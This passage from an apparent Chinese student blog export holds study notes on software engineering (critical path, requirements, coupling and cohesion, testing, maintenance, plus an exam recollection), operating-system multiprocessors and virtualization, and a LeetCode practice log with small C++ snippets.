</ul>
</li>
</ul>
<h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><ul>
<li>The critical path is the one for which the slack at every node is zero.</li>
<li>关键路径是每个节点的松弛度为零的路径。</li>
</ul>
<p>从活动图找出关键路径!!! 书后两条练习题 ⭐</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对于活动A_B,P-A-B-S 表示前驱活动P_A,后继活动B_S</span></span><br><span class="line"><span class="comment">//活动A_B可能有不止一个前驱/后继, 此时用Pi_A,B_Si表示</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> time_point int		<span class="comment">//时刻</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> time_period int		<span class="comment">//时间段</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> START 1				<span class="comment">//开始时间=1</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> END END				<span class="comment">//结束时间END</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pre</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    <span class="comment">//返回活动A_B的前驱活动数量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    <span class="comment">//返回活动A_B的后继活动数量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">time_period <span class="title">T</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    <span class="comment">//返回活动A_B需要的时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">time_point <span class="title">EST</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    time_point re;</span><br><span class="line">    <span class="keyword">int</span> preNum = pre(A_B);</span><br><span class="line">    <span class="keyword">if</span>(preNum == <span class="number">0</span>)</span><br><span class="line">        re = START;</span><br><span class="line">    <span class="keyword">if</span>(preNum == <span class="number">1</span>)</span><br><span class="line">        re = EST(P_A) + T(P_A);</span><br><span class="line">    <span class="keyword">if</span>(preNum &gt; <span class="number">1</span>)</span><br><span class="line">        re = <span class="built_in">max</span>(EST(Pi_A) + T(Pi_A));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">time_point <span class="title">LST</span><span class="params">(A_B)</span></span>&#123;</span><br><span class="line">    time_point re;</span><br><span class="line">    <span class="keyword">int</span> subNum = sub(A_B);</span><br><span class="line">    <span class="keyword">if</span>(subNum == <span class="number">0</span>)</span><br><span class="line">        re = END - T(A_B);</span><br><span class="line">    <span class="keyword">if</span>(subNum == <span class="number">1</span>)</span><br><span class="line">        re = LST(B_S) - T(A_B);</span><br><span class="line">    <span class="keyword">if</span>(subNum &gt; <span class="number">1</span>)</span><br><span class="line">        re = <span class="built_in">min</span>(LST(B_Si) - T(A_B));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四章-需求分析"><a href="#第四章-需求分析" class="headerlink" title="第四章 需求分析"></a>第四章 需求分析</h2><h3 id="定义-需求"><a href="#定义-需求" class="headerlink" title="定义: 需求"></a>定义: 需求</h3><ul>
<li><p>An <strong>Expression</strong> of desired <strong>Behavior</strong></p>
<p>期望行为的一种表达。</p>
</li>
</ul>
<p>四种需求</p>
<ul>
<li><p>functional requirement : 功能性需求</p>
<p>describes required behavior in terms of required activities</p>
</li>
<li><p>nonfunctional requirement (quality function) 非功能性需求(质量需求)</p>
<p>describes some quality characteristic that the software must possess.</p>
</li>
<li><p>design constraint 设计约束</p>
<p>a design decision,such as choice of platform.</p>
</li>
<li><p>process constraint 过程约束</p>
<p>a restriction on the techniques or resources that can be used to build the system.</p>
</li>
</ul>
<h3 id="ERD（实体关系图）"><a href="#ERD（实体关系图）" class="headerlink" title="ERD（实体关系图）"></a>ERD（实体关系图）</h3><ul>
<li><p>entity-relationship diagram (ERD): </p>
<p>is a popular graphical notational paradigm.</p>
</li>
<li><p>三要素</p>
<ul>
<li>An entity, epicted as a rectangle, represents a collection of  <pre><code>real-world objects that have common properties and behaviors.
</code></pre></li>
<li>A relationship, depicted as an edge between two entities, with diamond<pre><code>in the middle  of the edge specifying the type of relationship.
</code></pre></li>
<li>An attribute, an annotation(注释) on an entity that describes data or <pre><code>properties associated with the entity.
</code></pre></li>
</ul>
</li>
</ul>
<h3 id="DFD-Data-Flow-Diagram数据流图"><a href="#DFD-Data-Flow-Diagram数据流图" class="headerlink" title="DFD Data Flow Diagram数据流图"></a>DFD Data Flow Diagram数据流图</h3><p>Process, data flow, data store, actors </p>
<h3 id="UCD-（用例图）"><a href="#UCD-（用例图）" class="headerlink" title="UCD （用例图）"></a>UCD （用例图）</h3><ul>
<li>概念: use-case diagram(UCD) is similar to a top-level data-flow diagram that depicts observable,user-initiated functionality in terms of interactions between the system and its environment.用例图(UCD)类似于顶级数据流图，根据系统和环境之间的交互描述可观察的、用户发起的功能。</li>
<li>用处: <u>用于表示需求, 不是设计</u></li>
<li>怎么画?<ul>
<li>边界</li>
<li>case</li>
</ul>
</li>
</ul>
<h3 id="两种文档-区别作用"><a href="#两种文档-区别作用" class="headerlink" title="两种文档 (区别作用)"></a>两种文档 (区别作用)</h3><ul>
<li><p>require <strong><u>definition</u></strong> 需求分析说明书 For <strong>Customer</strong></p>
<p>一般是对某个市场或者是客户群来讲的，类似于调研报告，重点是体现出产品要满足哪些功能，哪些是重点、热点。</p>
</li>
<li><p>require <strong><u>specificatiuon</u></strong> 需求规格说明书 For <strong>Developer</strong></p>
<p>是从业务规则讲起的，细一点偏向于软件的概要设计。是从开发、测试的角度去讲产品功能，里面要包含原型界面、业务接口、活动图等 </p>
</li>
</ul>
<h2 id="第五章-体系结构"><a href="#第五章-体系结构" class="headerlink" title="第五章 体系结构"></a>第五章 体系结构</h2><h3 id="定义-设计"><a href="#定义-设计" class="headerlink" title="定义: 设计"></a>定义: 设计</h3><ul>
<li>Design is the creative process of figuring out how to implement all of the customer’s requirements; </li>
<li>the resulting plan is also called the design.</li>
<li>设计是找出如何实现客户所有要求的创造性过程;</li>
<li>最终的方案也称为设计。</li>
</ul>
<h3 id="体系结构三要素-3C-⭐"><a href="#体系结构三要素-3C-⭐" class="headerlink" title="体系结构三要素(3C)⭐"></a>体系结构三要素(3C)⭐</h3><p>软件体系结构={构件，连接件，约束}</p>
<ul>
<li>component(构件): 可以是一组代码，如程序模块，也可以是一个独立运行的程序，如数据库服务器。</li>
<li>connector(连接件):可以是过程调用，管道，远程调用等，用于表示构建之间的相互作用。</li>
<li>constraint(约束)：对象的连接规则。</li>
</ul>
<p>分解</p>
<p>自顶向下</p>
<p>合成</p>
<h3 id="Style"><a href="#Style" class="headerlink" title="Style"></a>Style</h3><p>概念! </p>
<ul>
<li>管道过滤器 <strong>Piper-and-Filter</strong><ul>
<li>管道是干什么的? 过滤器是什么?</li>
<li>Transmit data form one filter to then next</li>
<li>MIS system of XIDIAN University 西电迎新系统</li>
</ul>
</li>
<li>客户服务器 <strong>Client-Server</strong><ul>
<li>Most transaction processing system(事务处理系统)    Eg. Bank System</li>
</ul>
</li>
<li>…</li>
</ul>
<h2 id="第六章-模块设计"><a href="#第六章-模块设计" class="headerlink" title="第六章 模块设计"></a>第六章 模块设计</h2><p>什么是模块化?</p>
<ul>
<li>Modularity, also called separation of concerns, is the principle of keeping separate the various unrelated aspects of a system, so that each aspect can be studied in isolation. </li>
<li>不相关的方面的相互独立</li>
</ul>
<p>什么是独立性? Independence?   Separation of Concern</p>
<h3 id="Coupling-六耦合"><a href="#Coupling-六耦合" class="headerlink" title="Coupling 六耦合"></a>Coupling 六耦合</h3><ul>
<li>非直接耦合 Uncoupled</li>
<li>数据耦合 Data</li>
<li>标记耦合 Stamp</li>
<li>控制耦合 Control</li>
<li>公共耦合 Common</li>
<li>内容耦合 Content</li>
</ul>
<h3 id="Concerns-七内聚"><a href="#Concerns-七内聚" class="headerlink" title="Concerns  七内聚"></a>Concerns  七内聚</h3><ul>
<li>偶然内聚 Coincidence</li>
<li>逻辑内聚 Logic</li>
<li>时间内聚 Temporal</li>
<li>过程内聚 Procedural</li>
<li>通信内聚 Communicational</li>
<li>功能内聚 Functional</li>
<li>(信息内聚) Information</li>
</ul>
<p>耦合与内聚 各考一个(判断是什么类型的耦合\内聚)</p>
<h2 id="第七章-编程"><a href="#第七章-编程" class="headerlink" title="第七章 编程"></a>第七章 编程</h2><h3 id="程序三要素"><a href="#程序三要素" class="headerlink" title="程序三要素"></a>程序三要素</h3><ul>
<li>控制结构 Control Structural</li>
<li>算法 Algorithm</li>
<li>数据结构 Data Structure</li>
</ul>
<h3 id="注释-Head-comment-Block"><a href="#注释-Head-comment-Block" class="headerlink" title="注释: Head_comment_Block"></a>注释: Head_comment_Block</h3><p>里面有什么东西(7个)</p>
<ol>
<li>Program SCAN</li>
<li>Programmer</li>
<li>Calling sequence</li>
<li>Version</li>
<li>Revision</li>
<li>Purpose</li>
<li>Data structure</li>
<li>Algorithm</li>
</ol>
<h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p>内部 Internal documentation</p>
<ul>
<li>Head Comment Block</li>
<li>Other Program Comment</li>
<li>Meaningful Variable Names and Statement Labels</li>
<li>Formatting to Enhance Understanding</li>
</ul>
<p>外部 External documentation</p>
<ul>
<li>describing the problem</li>
<li>describing the algorithm</li>
<li>describing the data</li>
</ul>
<p>各包括什么content</p>
<h2 id="第八章-单元测试-⭐"><a href="#第八章-单元测试-⭐" class="headerlink" title="第八章 单元测试 ⭐"></a>第八章 单元测试 ⭐</h2><p>测试方法</p>
<p>测试用例: </p>
<ul>
<li>A test point or test case is <u>a particular choice of <strong>input data</strong></u> to be used in test a program.</li>
<li>测试点或测试用例是用于测试程序的输入数据的特定选择</li>
</ul>
<p>覆盖  由方法选数据</p>
<p>黑盒白盒: 各测试什么(功能/结构)</p>
<ul>
<li>We view the test object form the outside as a <u>closed or black box</u> whose contents are unknown, our testing <strong>feeds inputs to the closed box and notes what output is produced.</strong><br>我们从外部将测试对象视为一个关闭的或内容未知的黑盒，我们的测试将输入输入到关闭的盒子中，并记录产生了什么输出。</li>
<li>We view the test object as an <u>open</u> <u>box and or white box</u>, we can use the <strong>structure</strong> of the test object to test in different way.<br>我们将测试对象看作是一个开放的盒子或者白盒子，我们可以使用测试对象的结构以不同的方式进行测试。</li>
</ul>
<p>路径测试———-给程序, 画流程图,画控制图; 给图, 找测试路径</p>
<h2 id="第九章-系统测试"><a href="#第九章-系统测试" class="headerlink" title="第九章 系统测试"></a>第九章 系统测试</h2><p>Rush Time 高峰时间</p>
<p>概念: 前五个</p>
<ul>
<li>压力 Stress Test</li>
<li>容量 Volume Test</li>
<li>配置 Configuration Test</li>
<li>Compatibility Test</li>
<li>Regression Test</li>
<li>…</li>
</ul>
<h2 id="第十章-系统交付"><a href="#第十章-系统交付" class="headerlink" title="第十章 系统交付"></a>第十章 系统交付</h2><p>概念</p>
<ul>
<li><p>R 可靠性</p>
<p>The software reliability is a <strong>possibility</strong> of the system will <strong>operate without failure</strong> under a given conditions and a given time interval.<br>软件可靠性是指系统在给定条件和给定时间间隔下无故障运行的可能性。</p>
</li>
<li><p>A 可用性</p>
<p>The software availability is the <strong>probability</strong> that a system <strong>is operating successfully</strong> according to specification at a given point of time.</p>
</li>
<li><p>M 可维护性</p>
<p>The software maintainability is the probability that , for a given condition of use, a maintenance activity <strong>can be carried out</strong> within stated time interval and using stated procedures and resources.</p>
<p>给定的使用条件下，可以在规定的时间间隔内并使用规定的过程和资源进行维护活动的可能性。</p>
</li>
<li><p>PPT原话!!!!</p>
</li>
</ul>
<h2 id="第十一章-系统维护"><a href="#第十一章-系统维护" class="headerlink" title="第十一章 系统维护"></a>第十一章 系统维护</h2><p>维护的定义</p>
<p>Any work done to change the system after it is in operation is considered to be maintenance.<br>在系统运行后为改变系统所做的任何工作都被认为是维护。</p>
<p>四类维护: 判断是什么样的维护…</p>
<ol>
<li>Corrective Maintenance     ：Bug 改正性维护</li>
<li>Adaptive Maintenance    ：Table-Driven Design 适应性维护</li>
<li>Perfective Maintenance    : DB Upgrade to New Version 完善性维护</li>
<li>Preventive Maintenance    : Printer Driver: Print-line 预防性维护</li>
</ol>
<h2 id="彩蛋-2020年软工概论考题回忆版"><a href="#彩蛋-2020年软工概论考题回忆版" class="headerlink" title="彩蛋: 2020年软工概论考题回忆版"></a>彩蛋: 2020年软工概论考题回忆版</h2><p>题型:选择*15+判断*10+简答*5+大题*3</p>
<p>选择判断基本全是课后题里面的原句扣关键字</p>
<p>20年简答:<br>简述瀑布模型及优缺点<br>ERD三要素及功能<br>简述pip and filter的功能<br>简述Head block comment包括的内容<br>简述corrective maintenance</p>
<p>20年大题:<br>Critical Path<br>Branch Test<br>Logic Flow-&gt;possible path</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>软件工程概论</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统之多处理器系统</title>
    <url>/2020/08/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E5%A4%9A%E5%A4%84%E7%90%86%E5%99%A8%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p>本章将会涉及:</p>
<ol>
<li>多处理器系统</li>
<li>多计算机系统</li>
<li>虚拟化</li>
<li>分布式</li>
</ol>
<a id="more"></a>
<p>对更快的计算是推动计算机进步的动力. 除了从技术层面上突破(如优化芯片) , 人们还设计了这些系统来提高计算水平. </p>
<ol>
<li><p>计算机并行处理, 主要体现在同一个计算机中存在多个处理器 , 这些处理器 <u>共享内存模块</u> (share memory model ). 称为 <strong>多处理器系统</strong> (<strong>Multiprocessors</strong>)</p>
<blockquote>
<p>注意与 <strong>多核</strong> 的区别</p>
<p>多处理器指: 在一个机器中有多个处理器;</p>
<p>多核: 在一个处理器中有多个处理芯片</p>
</blockquote>
</li>
<li><p>多个计算机相互协作. 表现为不同的计算机通过 <u>消息传递</u> 的而协作.(紧耦合)  称为 <strong>多计算机系统</strong> (<strong>Multicomputers</strong> )</p>
</li>
<li><p>多个计算机互相协作. 表现为通过 <u>广域分布式系统</u> (指网络) 协作. (松耦合) 称为 <strong>分布式系统</strong> (<strong>Distributed systems</strong>)</p>
</li>
</ol>
<p><img src='https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%B8%89%E7%A7%8D%E6%8A%80%E6%9C%AF.png' height = '500' width = '1300'></img></p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E6%AF%94%E8%BE%83.png" alt=""></p>
<p>除此之外本章还会涉及到 <strong>虚拟化技术</strong> (Virtualization ).</p>
<h2 id="多处理器系统"><a href="#多处理器系统" class="headerlink" title="多处理器系统"></a>多处理器系统</h2><p>在一个计算机系统内部，两个以上的CPU共享对一个公共RAM都拥有的完全访问权限. 根据不同CPU读写速度的不同又分为</p>
<ol>
<li><p>UMA ( Uniform Memory Access ， 统一内存访问)</p>
<p>每个存储器字的读出速度是一样快的。 </p>
<p>主要有三种硬件实现</p>
<ol>
<li>Bus-Based Architectures 总线结构</li>
<li>Crossbar Switches  交叉开关</li>
<li>Multistage Switching Networks  多级交换网络</li>
</ol>
</li>
<li><p>NUMA ( Nonuniform Memory Access， 非统一内存 访问 )</p>
<p>存储器访问时间取决于相对于处理器的存储器位置.</p>
<p>访问远程存储器的速度比本地存储器慢</p>
</li>
</ol>
<h3 id="UMA-的硬件实现"><a href="#UMA-的硬件实现" class="headerlink" title="UMA 的硬件实现"></a>UMA 的硬件实现</h3><p><em><u>了解</u></em></p>
<h4 id="总线结构"><a href="#总线结构" class="headerlink" title="总线结构"></a>总线结构</h4><p>字面意思, 每个CPU通过总线与内存交互. 又可分为三种:</p>
<ol>
<li>不带独立cache</li>
<li>拥有独立cache</li>
<li>拥有独立cache和私有内存</li>
</ol>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%B8%89%E7%A7%8D%E6%80%BB%E7%BA%BF.png" alt=""></p>
<p>问题: CPU会争夺总线的使用权, 引起<strong>竞争</strong>.</p>
<h4 id="交叉开关"><a href="#交叉开关" class="headerlink" title="交叉开关"></a>交叉开关</h4><p>对于 $n$ 个CPU 构建 $n\times n$ 的交叉开关网络. </p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%BA%A4%E5%8F%89%E5%BC%80%E5%85%B3.png" alt=""></p>
<p>优点: 绝对不会竞争或阻塞</p>
<p>缺点: 开销过大</p>
<h4 id="多级交换网络"><a href="#多级交换网络" class="headerlink" title="多级交换网络"></a>多级交换网络</h4><p>使用 2*2 的交换机来构建多级交换网络.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E5%A4%9A%E7%BA%A7%E4%BA%A4%E6%8D%A2.png" alt=""></p>
<p>上图是三级交换网络, 对于 $n$ 个CPU, 仅需要 $3\times \frac n 2$ 个交换机. 同时每个线路的可通达度大幅提高了.</p>
<h3 id="OS-划分类型"><a href="#OS-划分类型" class="headerlink" title="OS 划分类型"></a>OS 划分类型</h3><h4 id="类型１-每个CPU都有自己的OS"><a href="#类型１-每个CPU都有自己的OS" class="headerlink" title="类型１: 每个CPU都有自己的OS"></a>类型１: 每个CPU都有自己的OS</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E7%8B%AC%E8%87%AA1.png" alt=""></p>
<ul>
<li>内存划分为n个部分</li>
<li>为每个CPU分配自己的专用内存和操作系统的专用副本</li>
<li>OS每个操作系统都有自己的表，不共享进程；<br>没有共享页面</li>
</ul>
<h4 id="类型2-主从处理器"><a href="#类型2-主从处理器" class="headerlink" title="类型2: 主从处理器"></a>类型2: 主从处理器</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%B8%BB%E4%BB%8E2.png" alt=""></p>
<ul>
<li>OS及其表的一个副本位于CPU1上</li>
<li>所有系统调用都重定向到CPU1进行处理</li>
<li>缺点: 如果从处理器过多, 主处理器的性能将成为系统的瓶颈</li>
</ul>
<h4 id="类型3-对称处理器"><a href="#类型3-对称处理器" class="headerlink" title="类型3: 对称处理器"></a>类型3: 对称处理器</h4><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E5%AF%B9%E7%A7%B03.png" alt=""></p>
<ul>
<li>内存中只有一个OS副本，但是任何CPU都可以运行它</li>
<li>使用互斥量(锁)保证只有一个处理器在使用OS </li>
</ul>
<h3 id="处理器的调度"><a href="#处理器的调度" class="headerlink" title="处理器的调度"></a>处理器的调度</h3><h4 id="分时调度-Timesharing"><a href="#分时调度-Timesharing" class="headerlink" title="分时调度 Timesharing"></a>分时调度 Timesharing</h4><p>Using a single data structure for scheduling a multiprocessor</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/time.png" alt=""></p>
<h4 id="分空间调度-Space-sharing"><a href="#分空间调度-Space-sharing" class="headerlink" title="分空间调度 Space sharing"></a>分空间调度 Space sharing</h4><p>multiple threads at same time across multiple CPUs</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/15/space.png" alt=""></p>
<h4 id="Gang-Scheduling-（-群调度-）"><a href="#Gang-Scheduling-（-群调度-）" class="headerlink" title="Gang Scheduling （ 群调度 ）"></a>Gang Scheduling （ 群调度 ）</h4><ol>
<li>Groups of related threads scheduled as a unit (a gang)</li>
<li>All members of gang run simultaneously （ 同时 ） on different timeshared CPUs </li>
<li>All gang members start and end time slices together</li>
</ol>
<p><em>其他的应该不是重点</em></p>
<hr>
<h2 id="多计算机系统"><a href="#多计算机系统" class="headerlink" title="多计算机系统"></a>多计算机系统</h2><p>一言以蔽之: <u>不共享内存的紧密耦合CPU</u></p>
<p>又称为cluster computers (群集计算机) , clusters of workstations (群集工作站,COW)</p>
<p>每个CPU的内存连接在自己的CPU上并且不会被其他CPU访问到. </p>
<p><em>本节不是重点</em></p>
<h3 id="互联拓扑结构"><a href="#互联拓扑结构" class="headerlink" title="互联拓扑结构"></a>互联拓扑结构</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%BA%92%E8%81%94%E6%8B%93%E6%89%91.png" alt=""></p>
<p>星型; 环型; 网格; 双环; 立方; 超立方</p>
<h3 id="存储转发分组交换"><a href="#存储转发分组交换" class="headerlink" title="存储转发分组交换"></a><strong>存储转发分组交换</strong></h3><h3 id="其他链接方式"><a href="#其他链接方式" class="headerlink" title="其他链接方式"></a><strong>其他链接方式</strong></h3><p>电路交换</p>
<p>虫孔路由</p>
<p>…</p>
<h3 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h3><ul>
<li>根据计算能力的需要，可能需要在多台刀片服务器上部署 应用，即分布式应用部署。</li>
<li>为了在这个分布式计算环境上，给最终用户一个集成的开 发环境，让用户感觉是在一台计算机上进行编程一样，底 层多台刀片服务器之间需要使用远程过程调用RPC。</li>
<li>选型RPC 框架时，主要考虑三个关键方面：传输协议与数 据类型（JSON、XML 等），数据的存储、传输效率，服 务器端对数据的请求方式。</li>
</ul>
<hr>
<h2 id="虚拟化⭐"><a href="#虚拟化⭐" class="headerlink" title="虚拟化⭐"></a>虚拟化⭐</h2><p>虚拟机技术，通常简称为 <strong>虚拟化</strong> virtualization 。<br>该技术允许一台计算机托管多个虚拟机，每个虚拟机可能运行不同的操作系统。</p>
<p>优点:</p>
<ul>
<li>一个虚拟机的故障不会自动导致其他任何故障。 </li>
<li>拥有更少的物理机可以节省硬件成本并占用更少的空间</li>
<li>检查点和迁移虚拟机比普通的要容易得多</li>
<li>在不再受支持或无法在当前硬件上运行的操作系统上运行旧版应用程序</li>
<li>在软件开发时确保软件可以在不同的OS上运行。</li>
</ul>
<p><strong>Hypervisor</strong>, also called Virtual Machine Monitor (VMM, 虚拟机监视器)它是在硬件层之上，独立于操作系统的一层软件。创建虚拟化平台，OS实例运行在这个平台上，使得硬件可以被多个OS和应用共享.</p>
<p><em><u>搞清楚几种的区别</u></em></p>
<h3 id="Type-1-Hypervisor"><a href="#Type-1-Hypervisor" class="headerlink" title="Type 1 Hypervisor"></a>Type 1 Hypervisor</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E8%99%9A%E6%8B%9F%E5%8C%961.png" alt=""></p>
<ul>
<li>Hypervisor 直接运行在硬件之上, 其余的OS运行在Hypervisor 上.</li>
<li>但是OS都以为自己在内核上 (实际是用户态)</li>
<li>被称为 <strong>虚拟内核态</strong> (virtual kernel mode)</li>
<li>例如: Hyper-V, Xen, Vmware vSphere</li>
</ul>
<h3 id="Type-2-Hypervisors"><a href="#Type-2-Hypervisors" class="headerlink" title="Type 2 Hypervisors"></a>Type 2 Hypervisors</h3><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E8%99%9A%E6%8B%9F%E5%8C%962.png" alt=""></p>
<ul>
<li>主OS运行在硬件上, Hypervisor 运行在主OS上, 其余OS 运行在Hypervisor 上.</li>
<li>当虚拟OS第一次启动时, Hypervisor 引导它们安装在虚拟磁盘上</li>
<li>例如:  Vmware worksation, Parallels, VM virtualBox</li>
</ul>
<h3 id="Paravirtualization-半虚拟化"><a href="#Paravirtualization-半虚拟化" class="headerlink" title="Paravirtualization  半虚拟化"></a>Paravirtualization  半虚拟化</h3><p>修改来宾操作系统的源代码，以便根本不执行敏感指令，而进行 <strong>hypervisor calls</strong>.</p>
<p>Hypervisor 定义接口，该接口由guest操作系统可以使用的一组过程调用组成（API）.</p>
<p>这种限制guest操作系统敏感操作的方式称为 <strong>半虚拟化</strong> (paravirtualized)</p>
<hr>
<h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h2><p><em>不是重点</em></p>
<p>使用中间件技术实现一致性.</p>
<p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/08/%E4%B8%AD%E9%97%B4%E4%BB%B6.png" alt=""></p>
<hr>
<p><strong>操作系统系列</strong></p>
<ol>
<li>🔗<a href="https://luy-hb.xyz/2020/08/14/操作系统之概述/" target="_blank" rel="noopener">操作系统之概述</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/05/操作系统之进程线程/" target="_blank" rel="noopener">操作系统之进程线程</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/08/操作系统之进程间通信/" target="_blank" rel="noopener">操作系统之进程间通信</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/04/操作系统之死锁/" target="_blank" rel="noopener">操作系统之死锁</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/06/09/操作系统之内存管理/" target="_blank" rel="noopener">操作系统之内存管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/05/操作系统之IO管理/" target="_blank" rel="noopener">操作系统之IO管理</a></li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/06/操作系统之文件系统/" target="_blank" rel="noopener">操作系统之文件系统</a></li>
<li>操作系统之多处理器系统 (本文)</li>
<li>🔗<a href="https://luy-hb.xyz/2020/08/11/操作系统之安全/" target="_blank" rel="noopener">操作系统之安全</a></li>
</ol>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode刷题流水账2020-09</title>
    <url>/2020/10/02/LeetCode%E5%88%B7%E9%A2%98%E6%B5%81%E6%B0%B4%E8%B4%A62020-09/</url>
    <content><![CDATA[<p>刷完了初级题库, 对各分类的简单算法有了基础的认知</p>
<p>整理了一些STL的常用函数(不全面) </p>
<p>开始由C++专向Java</p>
<a id="more"></a>
<p>2020年8月22日 “再度”开始刷力扣</p>
<p>既然决定不读研就好好刷题学工程吧</p>
<p>每周七题以上. 如果遇到考试周等特别情况可以提前一周完成任务, 不得向后拖延.</p>
<h2 id="2020年9月1日-week1"><a href="#2020年9月1日-week1" class="headerlink" title="2020年9月1日-week1"></a>2020年9月1日-week1</h2><p>主题:链表+字符串</p>
<h3 id="141-环形链表"><a href="#141-环形链表" class="headerlink" title="[141] 环形链表"></a>[141] 环形链表</h3><p>简单题</p>
<p>检测给出的链表中有没有环</p>
<p>第一下自己没有想出来, 看了题解. </p>
<p>方法1: 哈希表储存节点的出现次数———-只要定义的是<code>map&lt;listNode*, int&gt;</code> 就可以了.</p>
<p>方法2: 很巧妙, 快慢节点, 快每次走2步, 慢每次走1步. 如果有环快慢指针会相遇, 没有环则快指针会走到尽头.</p>
<p>注意: 方法2最后的判断应该是: <code>fNode != nullptr &amp;&amp; fNode-&gt;next != nullptr</code> 因为<code>fnode</code>每次走两步!</p>
<h3 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="[344] 反转字符串"></a>[344] 反转字符串</h3><p>简单题</p>
<p>双指针, 左右端交换, 向中间靠拢</p>
<p>记得要 <code>i++, j--</code> ! 第二次忘了!</p>
<p>小技巧: 3次异或交换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s[left] ^&#x3D; s[right]</span><br><span class="line">s[right] ^&#x3D; s[left]</span><br><span class="line">s[left] ^&#x3D; s[right]</span><br></pre></td></tr></table></figure>
<p>即可实现两个元素交换,且不用花费额外空间,还快</p>
<p>此外还可以使用算法库中的 <a href="https://zh.cppreference.com/w/cpp/algorithm/reverse" target="_blank" rel="noopener">reverse(begin, end)</a></p>
<h2 id="2020年9月2日-week2"><a href="#2020年9月2日-week2" class="headerlink" title="2020年9月2日-week2"></a>2020年9月2日-week2</h2><p>主题: 字符串</p>
<h3 id="7-整数反转"><a href="#7-整数反转" class="headerlink" title="[7] 整数反转"></a>[7] 整数反转</h3><p>简单题(大概)</p>
<p>单看数据反转这个要求其实不难, x每次退栈个位数, re此时入栈. 问题在于涉及到溢出的判断.</p>
<p>这里考察了一下下对于数据储存的理解是否深刻. 见<a href="https://leetcode-cn.com/problems/reverse-integer/solution/hua-jie-suan-fa-7-zheng-shu-fan-zhuan-by-guanpengc/" target="_blank" rel="noopener">题解</a></p>
<p>此外, 在<code>limit.h</code>中储存的INT_MAX等数据</p>
<h2 id="2020年9月3日-week2"><a href="#2020年9月3日-week2" class="headerlink" title="2020年9月3日-week2"></a>2020年9月3日-week2</h2><p>主题:字符串</p>
<h3 id="387-字符串中的第一个唯一字符"><a href="#387-字符串中的第一个唯一字符" class="headerlink" title="[387] 字符串中的第一个唯一字符"></a>[387] 字符串中的第一个唯一字符</h3><p>简单题</p>
<p>解法一,hash+两次遍历,很容易想到</p>
<p>解法二,不借助hash 该字符第一次出现的位置和最后一次出现的位置一样，就证明不重复。</p>
<p>函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line">s.find_first_of(ch);	<span class="comment">//返回索引,找不到返回-1</span></span><br><span class="line">s.find_last_of(ch);		<span class="comment">//同上</span></span><br></pre></td></tr></table></figure>
